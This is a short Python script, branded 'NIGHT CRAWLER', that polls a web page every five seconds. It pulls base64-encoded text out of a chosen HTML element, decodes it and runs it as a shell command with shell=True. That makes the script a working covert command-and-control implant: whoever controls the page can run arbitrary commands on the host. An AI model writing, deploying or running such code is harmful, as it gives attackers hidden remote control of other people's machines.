import requests
from bs4 import BeautifulSoup
import base64
import sys
import subprocess
import time
import pyfiglet

oldcode = ""
noprint =  0

ascii_banner1 = pyfiglet.figlet_format("NIGHT", font = "alligator", width=100, justify="center")
ascii_banner2 = pyfiglet.figlet_format("CRAWLER", font = "alligator", width=100, justify="center")
print("")
print(ascii_banner1)
print(ascii_banner2)
print("-" * 100)

url = sys.argv[1] if len(sys.argv) > 1 else input('Enter target url: ')  or "http://localhost/feed_me"
html = sys.argv[2] if len(sys.argv) > 2 else input('Enter type of HTML element: ') or "div"
attribute = sys.argv[3] if len(sys.argv) > 3 else input("Enter type of attribute: ") or "id"
attributename   = sys.argv[4] if len(sys.argv) > 4 else input("Enter name of the attribute: ") or "m"
req = lambda: requests.get(url).text

while True :
    soup = BeautifulSoup(req(), 'html.parser')
    messages = soup.find_all(html, {attribute : attributename})

    if len(messages) > 0 :
        decodedmessage = base64.b64decode(messages[-1].text)

        if str(oldcode) != str(decodedmessage.decode('utf-8')) :
            subprocess.call(decodedmessage.decode('utf-8'), shell=True)
            oldcode = decodedmessage.decode('utf-8')
            print("THE FOLLOWED COMMAND HAS BEEN EXECUTED ->")
            print("")
            print("\033[1;32;40m" + decodedmessage.decode('utf-8') + "\033[0;37;40m")
            print("")
    else :
        if (noprint == 0) :
            print("")
            print("\033[91m-\033[0m" * 22)
            print('\033[91m' + 'No message to display' + '\033[0m')
            print("\033[91m-\033[0m" * 22)
            noprint = 1

    time.sleep(5)